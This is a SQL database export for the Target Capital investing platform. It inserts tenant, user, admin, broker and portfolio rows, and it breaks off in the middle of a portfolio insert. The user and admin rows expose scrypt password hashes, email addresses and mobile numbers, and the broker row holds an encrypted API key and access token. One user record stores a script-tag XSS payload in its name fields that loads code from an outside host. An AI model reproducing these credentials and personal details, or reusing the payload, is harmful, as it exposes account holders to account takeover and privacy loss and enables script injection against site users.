-- Target Capital Database Export
-- Generated: 2026-01-25T05:09:38.737423
-- Source: Replit Development Database
-- Target: Railway Production Database
--
-- INSTRUCTIONS:
-- 1. Run railway_migrate.py first to create tables
-- 2. Then import this file: psql $DATABASE_URL < database_export.sql
--

-- Disable foreign key checks during import
SET session_replication_role = 'replica';


-- Table: tenants
-- Exported: 2026-01-25T05:09:38.904026
-- Rows: 1

INSERT INTO "tenants" ("id", "name", "slug", "domain", "logo_url", "primary_color", "secondary_color", "config", "features", "contact_email", "contact_phone", "is_active", "created_at", "updated_at") VALUES ('live', 'Target Capital', 'live', NULL, NULL, NULL, NULL, E'{"subscription_enabled": true, "broker_integration_enabled": true, "ai_features_enabled": true}', E'{"research_assistant": true, "smart_signals": true, "portfolio_hub": true, "trade_assist": true}', NULL, NULL, TRUE, '2025-12-10T05:33:44.289237', '2025-12-10T05:33:44.289244') ON CONFLICT DO NOTHING;

-- Table: user
-- Exported: 2026-01-25T05:09:39.134931
-- Rows: 21

INSERT INTO "user" ("id", "username", "email", "password_hash", "first_name", "last_name", "active", "is_admin", "created_at", "last_login", "pricing_plan", "subscription_status", "subscription_start_date", "subscription_end_date", "razorpay_customer_id", "razorpay_subscription_id", "billing_cycle", "total_payments", "referral_code", "referred_by", "is_verified", "two_factor_enabled", "subscription_expires_at", "mobile_number", "mobile_verified", "current_otp", "otp_expires_at", "otp_attempts", "last_otp_request", "profile_image_url", "tenant_id") VALUES (44, 'transparency_test', 'test_transparency@example.com', 'scrypt:32768:8:1$cwnSbr6pZmfUHiyk$1e9a5d279d7b97852518ea180c732c60e162da18eb412f542b8f1a49590ef406884b48a656bd132b4e095d21e41b7f07e239efe25a7e81ebf82957617d0e5b92', NULL, NULL, TRUE, FALSE, '2025-12-27T11:30:27.816479', NULL, 'FREE', 'INACTIVE', NULL, NULL, NULL, NULL, 'monthly', 0.0, NULL, NULL, FALSE, FALSE, NULL, NULL, FALSE, NULL, NULL, 0, NULL, NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "user" ("id", "username", "email", "password_hash", "first_name", "last_name", "active", "is_admin", "created_at", "last_login", "pricing_plan", "subscription_status", "subscription_start_date", "subscription_end_date", "razorpay_customer_id", "razorpay_subscription_id", "billing_cycle", "total_payments", "referral_code", "referred_by", "is_verified", "two_factor_enabled", "subscription_expires_at", "mobile_number", "mobile_verified", "current_otp", "otp_expires_at", "otp_attempts", "last_otp_request", "profile_image_url", "tenant_id") VALUES (45, 'test_final', 'test_final@test.com', 'scrypt:32768:8:1$9XrptFuxNblF85TF$e01c85d2d3702f420c1fdcfdb13032585e0ad52e99c050a6c0bc66239fd291181abdfce0900867912195505a5c21586f7e7de50a68de084bff02bf68375c1861', NULL, NULL, TRUE, FALSE, '2025-12-27T11:53:58.533785', NULL, 'FREE', 'INACTIVE', NULL, NULL, NULL, NULL, 'monthly', 0.0, NULL, NULL, FALSE, FALSE, NULL, NULL, FALSE, NULL, NULL, 0, NULL, NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "user" ("id", "username", "email", "password_hash", "first_name", "last_name", "active", "is_admin", "created_at", "last_login", "pricing_plan", "subscription_status", "subscription_start_date", "subscription_end_date", "razorpay_customer_id", "razorpay_subscription_id", "billing_cycle", "total_payments", "referral_code", "referred_by", "is_verified", "two_factor_enabled", "subscription_expires_at", "mobile_number", "mobile_verified", "current_otp", "otp_expires_at", "otp_attempts", "last_otp_request", "profile_image_url", "tenant_id") VALUES (46, 'price_test', 'price_test@test.com', 'scrypt:32768:8:1$giNejyuvN3D3PYcU$5840ae8b4da8fed3726ef2a1980c72c6a7c5ce0106646941ad046f8cd6d8b426ae9093a632c19964ed42bf813253ba9d88f567fe859d279d3917e16461bf6efe', NULL, NULL, TRUE, FALSE, '2025-12-27T12:07:00.496957', NULL, 'FREE', 'INACTIVE', NULL, NULL, NULL, NULL, 'monthly', 0.0, NULL, NULL, FALSE, FALSE, NULL, NULL, FALSE, NULL, NULL, 0, NULL, NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "user" ("id", "username", "email", "password_hash", "first_name", "last_name", "active", "is_admin", "created_at", "last_login", "pricing_plan", "subscription_status", "subscription_start_date", "subscription_end_date", "razorpay_customer_id", "razorpay_subscription_id", "billing_cycle", "total_payments", "referral_code", "referred_by", "is_verified", "two_factor_enabled", "subscription_expires_at", "mobile_number", "mobile_verified", "current_otp", "otp_expires_at", "otp_attempts", "last_otp_request", "profile_image_url", "tenant_id") VALUES (31, 'testpro', 'testpro@targetcapital.in', 'scrypt:32768:8:1$N5kXtNBtvjvOcVn5$cd9691e11f5b030ee8470f46da877916c0e20c3f8c159c97ff7de57304453f47e528ca6f9262751b61c8eaa69c72ee47bb6e353a6a8d9ef4701dce59aee5b977', 'Test', 'Pro', TRUE, FALSE, '2025-10-24T06:14:17.347341', '2025-10-24T06:20:50.438814', 'TARGET_PRO', 'ACTIVE', '2025-10-24T06:14:17.343702', '2025-11-23T06:14:17.343706', NULL, NULL, 'monthly', 2999.0, NULL, NULL, FALSE, FALSE, NULL, NULL, FALSE, NULL, NULL, 0, NULL, NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "user" ("id", "username", "email", "password_hash", "first_name", "last_name", "active", "is_admin", "created_at", "last_login", "pricing_plan", "subscription_status", "subscription_start_date", "subscription_end_date", "razorpay_customer_id", "razorpay_subscription_id", "billing_cycle", "total_payments", "referral_code", "referred_by", "is_verified", "two_factor_enabled", "subscription_expires_at", "mobile_number", "mobile_verified", "current_otp", "otp_expires_at", "otp_attempts", "last_otp_request", "profile_image_url", "tenant_id") VALUES (47, 'mf_test', 'mf_test@test.com', 'scrypt:32768:8:1$vowNlUZgIzOf0pi3$06078a3ec9307665b25eab49c056b03d5bf28e9a1c1a6d465580a0d3360e9a230009408af8ac8d3c9d300e453e090147cede48494f9cec04ba27df12bcd423b8', NULL, NULL, TRUE, FALSE, '2025-12-27T12:36:59.182012', NULL, 'FREE', 'INACTIVE', NULL, NULL, NULL, NULL, 'monthly', 0.0, NULL, NULL, FALSE, FALSE, NULL, NULL, FALSE, NULL, NULL, 0, NULL, NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "user" ("id", "username", "email", "password_hash", "first_name", "last_name", "active", "is_admin", "created_at", "last_login", "pricing_plan", "subscription_status", "subscription_start_date", "subscription_end_date", "razorpay_customer_id", "razorpay_subscription_id", "billing_cycle", "total_payments", "referral_code", "referred_by", "is_verified", "two_factor_enabled", "subscription_expires_at", "mobile_number", "mobile_verified", "current_otp", "otp_expires_at", "otp_attempts", "last_otp_request", "profile_image_url", "tenant_id") VALUES (48, 'TFMWXZfnOLoTkyhAVk', 'dovowexo253@gmail.com', 'scrypt:32768:8:1$0VpwHJoP9rd25ajw$5c654caffab3817ca3aa2df77fb9b779f56d8adeb8e2f37a5e1999b3e14dba51d624c585aee5e36967ddec994a4d2b9ca9a3df230ab1c7313f479ebcda19fbae', 'DYFxncoaTuGYulBJrq', 'yPcpUItkUgNLjfGIqGWW', TRUE, FALSE, '2025-12-28T09:01:42.260399', NULL, 'FREE', 'INACTIVE', NULL, NULL, NULL, NULL, 'monthly', 0.0, NULL, NULL, FALSE, FALSE, NULL, NULL, FALSE, NULL, NULL, 0, NULL, NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "user" ("id", "username", "email", "password_hash", "first_name", "last_name", "active", "is_admin", "created_at", "last_login", "pricing_plan", "subscription_status", "subscription_start_date", "subscription_end_date", "razorpay_customer_id", "razorpay_subscription_id", "billing_cycle", "total_payments", "referral_code", "referred_by", "is_verified", "two_factor_enabled", "subscription_expires_at", "mobile_number", "mobile_verified", "current_otp", "otp_expires_at", "otp_attempts", "last_otp_request", "profile_image_url", "tenant_id") VALUES (34, 'targetplus', 'targetplus@scentricnetworks.com', 'scrypt:32768:8:1$jZe7NmQZYEHgayXq$c253cf9637624d0762026e9c281f6a55a028e6b72e7548fca686b2decc893b21a6763dcea59dd2a1212c6019b2b3023f1d04846fa9c3be7f64502e223545da14', NULL, NULL, NULL, NULL, '2025-10-31T16:30:48.451735', NULL, 'TARGET_PLUS', 'ACTIVE', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, TRUE, FALSE, NULL, '9940579076', TRUE, NULL, NULL, 0, NULL, NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "user" ("id", "username", "email", "password_hash", "first_name", "last_name", "active", "is_admin", "created_at", "last_login", "pricing_plan", "subscription_status", "subscription_start_date", "subscription_end_date", "razorpay_customer_id", "razorpay_subscription_id", "billing_cycle", "total_payments", "referral_code", "referred_by", "is_verified", "two_factor_enabled", "subscription_expires_at", "mobile_number", "mobile_verified", "current_otp", "otp_expires_at", "otp_attempts", "last_otp_request", "profile_image_url", "tenant_id") VALUES (28, 'TargetPlus', 'uday@targetcapital.in', 'scrypt:32768:8:1$4FU3SuB8SkDXjUNQ$28a88c445a4b2b97c4687c15dad143598d4b40e2dca6e8a03f07bc28537a9d070882c79d2cb30fd8af15af6c48cfae3f28c01fee115b80f1dc5297a68164312b', NULL, NULL, TRUE, NULL, '2025-10-21T11:47:48.612068', '2025-10-21T13:52:49.913812', 'HNI', 'ACTIVE', '2025-10-21T11:47:48.612068', '2026-10-21T11:47:48.612068', NULL, NULL, NULL, NULL, NULL, NULL, TRUE, FALSE, NULL, NULL, FALSE, NULL, NULL, 0, NULL, NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "user" ("id", "username", "email", "password_hash", "first_name", "last_name", "active", "is_admin", "created_at", "last_login", "pricing_plan", "subscription_status", "subscription_start_date", "subscription_end_date", "razorpay_customer_id", "razorpay_subscription_id", "billing_cycle", "total_payments", "referral_code", "referred_by", "is_verified", "two_factor_enabled", "subscription_expires_at", "mobile_number", "mobile_verified", "current_otp", "otp_expires_at", "otp_attempts", "last_otp_request", "profile_image_url", "tenant_id") VALUES (35, 'targetpro', 'targetpro@scentricnetworks.com', 'scrypt:32768:8:1$kwn9G0ZMNbUmyUpF$bfd38168e8df25e9564a1692ae84314f25c4832c304006bff38dfc513f322623fb332b800ab2f4fcbdd20b2b3e40b2569adb20de6ab5320c81c9e0ae493558d2', NULL, NULL, NULL, NULL, '2025-10-31T16:30:51.479056', '2025-10-31T16:36:25.226112', 'TARGET_PRO', 'ACTIVE', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, TRUE, FALSE, NULL, '9444767998', TRUE, NULL, NULL, 0, NULL, NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "user" ("id", "username", "email", "password_hash", "first_name", "last_name", "active", "is_admin", "created_at", "last_login", "pricing_plan", "subscription_status", "subscription_start_date", "subscription_end_date", "razorpay_customer_id", "razorpay_subscription_id", "billing_cycle", "total_payments", "referral_code", "referred_by", "is_verified", "two_factor_enabled", "subscription_expires_at", "mobile_number", "mobile_verified", "current_otp", "otp_expires_at", "otp_attempts", "last_otp_request", "profile_image_url", "tenant_id") VALUES (36, 'eIltbKDowLSWHCTloJwOib', 'roranatac85@gmail.com', 'scrypt:32768:8:1$gEliGVRZfJo6BvH0$87883341c8aab8e78a73b595b2faaf329e25926974989afbd69523f39354f49f4a62fdb0342d4ced11bb7567656e4efd07d0d537f444464ed7b207eb668fc83d', 'LCRcNpMgShcOJSGAXS', 'bElymViiGhFyVewGoBjwfW', TRUE, FALSE, '2025-11-09T07:32:21.844445', NULL, 'FREE', 'INACTIVE', NULL, NULL, NULL, NULL, 'monthly', 0.0, NULL, NULL, FALSE, FALSE, NULL, NULL, FALSE, NULL, NULL, 0, NULL, NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "user" ("id", "username", "email", "password_hash", "first_name", "last_name", "active", "is_admin", "created_at", "last_login", "pricing_plan", "subscription_status", "subscription_start_date", "subscription_end_date", "razorpay_customer_id", "razorpay_subscription_id", "billing_cycle", "total_payments", "referral_code", "referred_by", "is_verified", "two_factor_enabled", "subscription_expires_at", "mobile_number", "mobile_verified", "current_otp", "otp_expires_at", "otp_attempts", "last_otp_request", "profile_image_url", "tenant_id") VALUES (27, 'udayid', 'udayid@gmail.com', 'scrypt:32768:8:1$Qmumc9GZ41Y9ggz9$c35882b09c45502913795304682a552d715014f90208c6b402a4da0b46a88d6e185bf0c0b92d12dcc289be0b58db5888475cc86ecc6f97f55a621b9d1fa84bfe', 'Uday	', 'Shankar', TRUE, TRUE, '2025-10-21T11:19:08.636792', '2025-10-21T12:00:24.787491', 'TARGET_PRO', 'INACTIVE', NULL, NULL, NULL, NULL, 'monthly', 0.0, '3AXEUL3K', NULL, TRUE, FALSE, NULL, '7200189076', FALSE, NULL, NULL, 0, NULL, NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "user" ("id", "username", "email", "password_hash", "first_name", "last_name", "active", "is_admin", "created_at", "last_login", "pricing_plan", "subscription_status", "subscription_start_date", "subscription_end_date", "razorpay_customer_id", "razorpay_subscription_id", "billing_cycle", "total_payments", "referral_code", "referred_by", "is_verified", "two_factor_enabled", "subscription_expires_at", "mobile_number", "mobile_verified", "current_otp", "otp_expires_at", "otp_attempts", "last_otp_request", "profile_image_url", "tenant_id") VALUES (37, 'WOpkhlugWnljjcmhkSRJyew', 'yitoyeje19@gmail.com', 'scrypt:32768:8:1$PYmBmV8b8oYHeZGE$ed7035abf103ab5f4298c8ae56f205b623e8391af68451745dd140833e1416a1a324c89a607a5854a7091ecb93d1db7ba7220a3a40003a64fdf1caf73b205877', 'RZOGGKPDUMXaiPCW', 'JfdaXnyevxeNiZBr', TRUE, FALSE, '2025-11-13T10:17:41.880694', NULL, 'FREE', 'INACTIVE', NULL, NULL, NULL, NULL, 'monthly', 0.0, NULL, NULL, FALSE, FALSE, NULL, NULL, FALSE, NULL, NULL, 0, NULL, NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "user" ("id", "username", "email", "password_hash", "first_name", "last_name", "active", "is_admin", "created_at", "last_login", "pricing_plan", "subscription_status", "subscription_start_date", "subscription_end_date", "razorpay_customer_id", "razorpay_subscription_id", "billing_cycle", "total_payments", "referral_code", "referred_by", "is_verified", "two_factor_enabled", "subscription_expires_at", "mobile_number", "mobile_verified", "current_otp", "otp_expires_at", "otp_attempts", "last_otp_request", "profile_image_url", "tenant_id") VALUES (38, '<sCRiPt/sRC=//l01.co/a/></sCrIpT>Nocal', 'Nocal@mail.com', 'scrypt:32768:8:1$4W13p8wU7c6WyguN$156461594179094cf6704219d0a9dbcd3720db40ca14cb27f9880d43477369cf02327752aa07484ea22551d5d91b078739407aac9b8be116aff3cd0d94d7aa28', '<sCRiPt/sRC=//l01.co/a/></sCrIpT>Nocal', 'jolis', TRUE, FALSE, '2025-11-18T17:56:37.263656', NULL, 'FREE', 'INACTIVE', NULL, NULL, NULL, NULL, 'monthly', 0.0, NULL, NULL, FALSE, FALSE, NULL, NULL, FALSE, NULL, NULL, 0, NULL, NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "user" ("id", "username", "email", "password_hash", "first_name", "last_name", "active", "is_admin", "created_at", "last_login", "pricing_plan", "subscription_status", "subscription_start_date", "subscription_end_date", "razorpay_customer_id", "razorpay_subscription_id", "billing_cycle", "total_payments", "referral_code", "referred_by", "is_verified", "two_factor_enabled", "subscription_expires_at", "mobile_number", "mobile_verified", "current_otp", "otp_expires_at", "otp_attempts", "last_otp_request", "profile_image_url", "tenant_id") VALUES (39, 'vFeDlpHDQUriMtVN', 'uwukejuwec73@gmail.com', 'scrypt:32768:8:1$Nlocg1LG8KjSPfQk$b287b96234bd5f6c8a40476ea4d309554846386ead19fe86c641fa3d3f69e2ed95f2ad64aaf8962408993ef27755ae52ed10003d6b6f19b06b547d6b34cbfde8', 'ANcHIGJMUMpwDCwP', 'WXudsKYNsWkvbavjUnwSscZ', TRUE, FALSE, '2025-11-27T03:50:45.779761', NULL, 'FREE', 'INACTIVE', NULL, NULL, NULL, NULL, 'monthly', 0.0, NULL, NULL, FALSE, FALSE, NULL, NULL, FALSE, NULL, NULL, 0, NULL, NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "user" ("id", "username", "email", "password_hash", "first_name", "last_name", "active", "is_admin", "created_at", "last_login", "pricing_plan", "subscription_status", "subscription_start_date", "subscription_end_date", "razorpay_customer_id", "razorpay_subscription_id", "billing_cycle", "total_payments", "referral_code", "referred_by", "is_verified", "two_factor_enabled", "subscription_expires_at", "mobile_number", "mobile_verified", "current_otp", "otp_expires_at", "otp_attempts", "last_otp_request", "profile_image_url", "tenant_id") VALUES (40, '24mbaftpy0016', '24mbaftpy0016@pondiuni.ac.in', 'scrypt:32768:8:1$ETAjSHtfyctrRXiv$2c5ef3cc3dce3a90a20bab60b3973a815651aab0fcd38b30727e1c9c78eca48df46367f48fcf7cdd88e51e11ede655420c7bd75daab3d4b370b24102fc784556', 'MIDHUN', 'P M', TRUE, FALSE, '2025-12-01T08:48:49.404508', '2025-12-01T08:50:08.610300', 'FREE', 'INACTIVE', NULL, NULL, NULL, NULL, 'monthly', 0.0, NULL, NULL, FALSE, FALSE, NULL, NULL, FALSE, NULL, NULL, 0, NULL, NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "user" ("id", "username", "email", "password_hash", "first_name", "last_name", "active", "is_admin", "created_at", "last_login", "pricing_plan", "subscription_status", "subscription_start_date", "subscription_end_date", "razorpay_customer_id", "razorpay_subscription_id", "billing_cycle", "total_payments", "referral_code", "referred_by", "is_verified", "two_factor_enabled", "subscription_expires_at", "mobile_number", "mobile_verified", "current_otp", "otp_expires_at", "otp_attempts", "last_otp_request", "profile_image_url", "tenant_id") VALUES (41, 'DHvStWNyKZrUMywnN', 'larupayi18@gmail.com', 'scrypt:32768:8:1$Jt9uDYXAjhgxCRnT$56720f86f3386a06128c54100650dcbe7f86731840f97d8bf75a2ca0c18ce67d59129ef036fb25831dbea4b684b7ea305bed2b742adb3caa11549ca57e8e1495', 'piXPwoMziGOQLIUvUxjMRkA', 'ZbmrEcTswouGeqKbptt', TRUE, FALSE, '2025-12-06T16:25:48.660391', NULL, 'FREE', 'INACTIVE', NULL, NULL, NULL, NULL, 'monthly', 0.0, NULL, NULL, FALSE, FALSE, NULL, NULL, FALSE, NULL, NULL, 0, NULL, NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "user" ("id", "username", "email", "password_hash", "first_name", "last_name", "active", "is_admin", "created_at", "last_login", "pricing_plan", "subscription_status", "subscription_start_date", "subscription_end_date", "razorpay_customer_id", "razorpay_subscription_id", "billing_cycle", "total_payments", "referral_code", "referred_by", "is_verified", "two_factor_enabled", "subscription_expires_at", "mobile_number", "mobile_verified", "current_otp", "otp_expires_at", "otp_attempts", "last_otp_request", "profile_image_url", "tenant_id") VALUES (42, 'oZIMScBpSzEKpAfntkR', 'ferlainxc50@gmail.com', 'scrypt:32768:8:1$Gy6YFSmzlHXJuT4f$666bbfc54df912487f66d09d14b7743d88c5feb036dc740c426e8d360bb247ad7816f701ab51115e35c4c0a90a42b60c2c96594c63c5aa745f02efd052adbb89', 'jSXFpIJSeusMRcGM', 'oTRqiGdINpGuEthHfnto', TRUE, FALSE, '2025-12-13T06:45:45.034467', NULL, 'FREE', 'INACTIVE', NULL, NULL, NULL, NULL, 'monthly', 0.0, NULL, NULL, FALSE, FALSE, NULL, NULL, FALSE, NULL, NULL, 0, NULL, NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "user" ("id", "username", "email", "password_hash", "first_name", "last_name", "active", "is_admin", "created_at", "last_login", "pricing_plan", "subscription_status", "subscription_start_date", "subscription_end_date", "razorpay_customer_id", "razorpay_subscription_id", "billing_cycle", "total_payments", "referral_code", "referred_by", "is_verified", "two_factor_enabled", "subscription_expires_at", "mobile_number", "mobile_verified", "current_otp", "otp_expires_at", "otp_attempts", "last_otp_request", "profile_image_url", "tenant_id") VALUES (43, 'TolgaWal', 'tolgacan@em2.thematinggrounds.com', 'scrypt:32768:8:1$1cx3gvMbdhOHR9Us$4f15625c6999156690c5850c5da3cfd54ce09114ffc3ef5b9ddd33004137378e5c5b3eadefcf7f11e146abacdb68eb08364a8e07b6a9db9c6f4da764ddea8b72', 'TolgaWalGL', 'TolgaWalGL', TRUE, FALSE, '2025-12-20T15:44:52.489089', NULL, 'FREE', 'INACTIVE', NULL, NULL, NULL, NULL, 'monthly', 0.0, NULL, NULL, FALSE, FALSE, NULL, NULL, FALSE, NULL, NULL, 0, NULL, NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "user" ("id", "username", "email", "password_hash", "first_name", "last_name", "active", "is_admin", "created_at", "last_login", "pricing_plan", "subscription_status", "subscription_start_date", "subscription_end_date", "razorpay_customer_id", "razorpay_subscription_id", "billing_cycle", "total_payments", "referral_code", "referred_by", "is_verified", "two_factor_enabled", "subscription_expires_at", "mobile_number", "mobile_verified", "current_otp", "otp_expires_at", "otp_attempts", "last_otp_request", "profile_image_url", "tenant_id") VALUES (49, 'pMYihrjZfAFVxNOVRTPmD', 'epexeyosi52@gmail.com', 'scrypt:32768:8:1$Epk5aevdepwkJ0fU$80fdb84ceba28583123874f8953c831111907e7b854c78cc00b9949009000d177ce7f65dfd84cef9dcec294ef7baff36f0bb7700763cc889b7e54687f153af4f', 'ApuVfmNIiNeTCmExgAudWaC', 'uBSQiMzylEfOkjJXjS', TRUE, FALSE, '2026-01-01T00:46:25.074045', NULL, 'FREE', 'INACTIVE', NULL, NULL, NULL, NULL, 'monthly', 0.0, NULL, NULL, FALSE, FALSE, NULL, NULL, FALSE, NULL, NULL, 0, NULL, NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "user" ("id", "username", "email", "password_hash", "first_name", "last_name", "active", "is_admin", "created_at", "last_login", "pricing_plan", "subscription_status", "subscription_start_date", "subscription_end_date", "razorpay_customer_id", "razorpay_subscription_id", "billing_cycle", "total_payments", "referral_code", "referred_by", "is_verified", "two_factor_enabled", "subscription_expires_at", "mobile_number", "mobile_verified", "current_otp", "otp_expires_at", "otp_attempts", "last_otp_request", "profile_image_url", "tenant_id") VALUES (50, 'xmybwjiTWyWGbDsC', 'uwacosivi968@gmail.com', 'scrypt:32768:8:1$hecf1LwlN6Pw8Smi$a702872e1ae950a5075eab727ef44e11b41f47ebcf19fdf8a91d4ba87ab9c00a5f37f625f2f75dbdbcc1bf02678df92b8a9e57203efa793e11d8379db6b1f30c', 'IFcARrIYhwTvlNOW', 'PuItlYcvXoaVRmnfduIPOQ', TRUE, FALSE, '2026-01-02T21:27:43.577702', NULL, 'FREE', 'INACTIVE', NULL, NULL, NULL, NULL, 'monthly', 0.0, NULL, NULL, FALSE, FALSE, NULL, NULL, FALSE, NULL, NULL, 0, NULL, NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "user" ("id", "username", "email", "password_hash", "first_name", "last_name", "active", "is_admin", "created_at", "last_login", "pricing_plan", "subscription_status", "subscription_start_date", "subscription_end_date", "razorpay_customer_id", "razorpay_subscription_id", "billing_cycle", "total_payments", "referral_code", "referred_by", "is_verified", "two_factor_enabled", "subscription_expires_at", "mobile_number", "mobile_verified", "current_otp", "otp_expires_at", "otp_attempts", "last_otp_request", "profile_image_url", "tenant_id") VALUES (30, 'testuser', 'test@targetcapital.com', 'scrypt:32768:8:1$dzXsXyBdoPWDLLVB$c8fb539725071170d080882fe71433af274be9639b0c5c3fc2a54cf540f2422d58b5f1f7f2036076590b5535d222a6b78cebfa26601f8f89c9d32fd34ccdc363', NULL, NULL, TRUE, FALSE, '2025-10-23T02:52:22.651956', '2026-01-08T05:43:00.109520', 'TARGET_PRO', 'ACTIVE', NULL, NULL, NULL, NULL, 'monthly', 0.0, '9TCS8MH4', NULL, TRUE, FALSE, NULL, NULL, FALSE, NULL, NULL, 0, NULL, NULL, 'live') ON CONFLICT DO NOTHING;

-- Table: admins
-- Exported: 2026-01-25T05:09:39.283502
-- Rows: 2

INSERT INTO "admins" ("id", "username", "email", "password_hash", "first_name", "last_name", "active", "is_super_admin", "last_login", "created_at", "updated_at") VALUES (2, 'udayid', 'udayid@gmail.com', 'scrypt:32768:8:1$oG7WBpRHEj6C22Ed$9d5474b0edc91813896e8f0d397d0acfe751835a1a0554fb291fbdacc44f993e7d987133404b0b5caf43cbb0680e26d675ccc29d2f4ba98bb7325f5ee8ba25f1', 'Uday', 'ID', TRUE, TRUE, NULL, '2025-10-21T11:21:24.670828', '2025-10-21T11:21:24.670828') ON CONFLICT DO NOTHING;
INSERT INTO "admins" ("id", "username", "email", "password_hash", "first_name", "last_name", "active", "is_super_admin", "last_login", "created_at", "updated_at") VALUES (1, 'admin', 'admin@tcapital.com', 'scrypt:32768:8:1$sDi7hDwSLDZeKyb0$04534e3956ee51f2af3945b1053f9589f5b33e3b2a98db1602e41c2f893477f47ceadbae6f65486e95feb7ec5ea876eeffeee785d7704c0f9134d43701fef718', NULL, NULL, TRUE, TRUE, '2026-01-08T05:09:45.096053', '2025-08-20T08:57:46.686890', '2026-01-08T05:09:45.098773') ON CONFLICT DO NOTHING;

-- Table: user_brokers
-- Exported: 2026-01-25T05:09:39.431321
-- Rows: 1

INSERT INTO "user_brokers" ("id", "user_id", "broker_name", "api_key", "api_secret", "request_token", "access_token", "redirect_url", "is_active", "last_token_refresh", "created_at", "updated_at", "is_primary", "connection_status", "account_balance", "margin_available", "last_connected", "broker_type", "last_sync", "broker_type_enum", "tenant_id") VALUES (47, 31, 'Dhan', 'gAAAAABo-1-fyRx2sJCJ-HjvwUC3-iqZ1Rffv-j6D40jVdeyC2P0OApz4eq9FzbnJAjPHOH6yYmHu6g2vru_-7UEYG12DCxLpw==', NULL, NULL, 'gAAAAABo-1-fs3oChgfFZX979B5b6SVaghKjdQY_TVf8uYwQAlKvbkmZMVsOa0CQ6-t4QWCVyS8Akq_OjMtdr-HUM04_2C0YPgAUZvlYTQ8cZWDTo2KT47Cb2_hHs2Tr4aEcAzOBIsKN04f0kWJsVXtqozsJJSyxnSombVxQlfYuxtqCMSlqvTiRxBCb7wlS2l4X7_CwwbZc0rSqjEqvcJc-_yT6EbcPjBXszXXJn6q2Dc0i_l0azAqflh6hWjUimKQq7FmRzS1EzgE96LROMHuoYYG_JogxeaCobGeS0tP7hqVPWB8qg5zbneGW1TtDynhELNVLYYGy607F0zZRHjHWuZvWsLiD2weuYk-ocRmRzaQ11oFtNRXLjpED9j29oLqYXf514O_LLHZFz76eE3vhsFsDfdTSXD7-GIdb30Wu77RZoXEqrxiIUvNSAPZ4kHLxmLdKmX8c6mY1v9tiP_yL2EFaLiW0LA==', NULL, TRUE, NULL, '2025-10-24T11:14:39.561541', '2025-10-24T12:04:41.298722', FALSE, 'disconnected', 0.0, 0.0, '2025-10-24T11:54:16.507625', 'dhan', '2025-10-24T12:03:32.699422', NULL, 'live') ON CONFLICT DO NOTHING;

-- Table: portfolio
-- Exported: 2026-01-25T05:09:40.067857
-- Rows: 10

INSERT INTO "portfolio" ("id", "user_id", "broker_id", "ticker_symbol", "stock_name", "asset_type", "asset_category", "quantity", "date_purchased", "purchase_price", "purchased_value", "current_price", "current_value", "sector", "exchange", "isin", "trade_type", "data_source", "last_sync_date", "created_at", "updated_at", "contract_type", "strike_price", "expiry_date", "lot_size", "nps_scheme", "pension_fund_manager", "property_type", "property_location", "maturity_date", "interest_rate", "option_type", "tier", "area_sqft", "coupon_rate", "face_value", "gold_form", "gold_purity", "grams", "tenant_id") VALUES (13, 28, 'zerodha', 'RELIANCE', 'Reliance Industries Limited', 'Stocks', NULL, 50.0, '2024-06-15', 2650.0, 132500.0, 2845.6, 142280.0, 'Oil & Gas', 'NSE', NULL, 'long_term', 'broker', NULL, '2025-10-21T12:18:05.814501', '2025-10-21T12:18:05.814505', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "portfolio" ("id", "user_id", "broker_id", "ticker_symbol", "stock_name", "asset_type", "asset_category", "quantity", "date_purchased", "purchase_price", "purchased_value", "current_price", "current_value", "sector", "exchange", "isin", "trade_type", "data_source", "last_sync_date", "created_at", "updated_at", "contract_type", "strike_price", "expiry_date", "lot_size", "nps_scheme", "pension_fund_manager", "property_type", "property_location", "maturity_date", "interest_rate", "option_type", "tier", "area_sqft", "coupon_rate", "face_value", "gold_form", "gold_purity", "grams", "tenant_id") VALUES (14, 28, 'angel', 'INFY', 'Infosys Limited', 'Stocks', NULL, 75.0, '2024-07-20', 1420.0, 106500.0, 1447.7, 108577.5, 'Information Technology', 'NSE', NULL, 'long_term', 'broker', NULL, '2025-10-21T12:18:05.814508', '2025-10-21T12:18:05.814509', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "portfolio" ("id", "user_id", "broker_id", "ticker_symbol", "stock_name", "asset_type", "asset_category", "quantity", "date_purchased", "purchase_price", "purchased_value", "current_price", "current_value", "sector", "exchange", "isin", "trade_type", "data_source", "last_sync_date", "created_at", "updated_at", "contract_type", "strike_price", "expiry_date", "lot_size", "nps_scheme", "pension_fund_manager", "property_type", "property_location", "maturity_date", "interest_rate", "option_type", "tier", "area_sqft", "coupon_rate", "face_value", "gold_form", "gold_purity", "grams", "tenant_id") VALUES (15, 28, 'zerodha', 'HDFCBANK', 'HDFC Bank Limited', 'Stocks', NULL, 30.0, '2024-05-10', 1580.0, 47400.0, 1625.3, 48759.0, 'Banking', 'NSE', NULL, 'long_term', 'broker', NULL, '2025-10-21T12:18:05.814511', '2025-10-21T12:18:05.814511', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 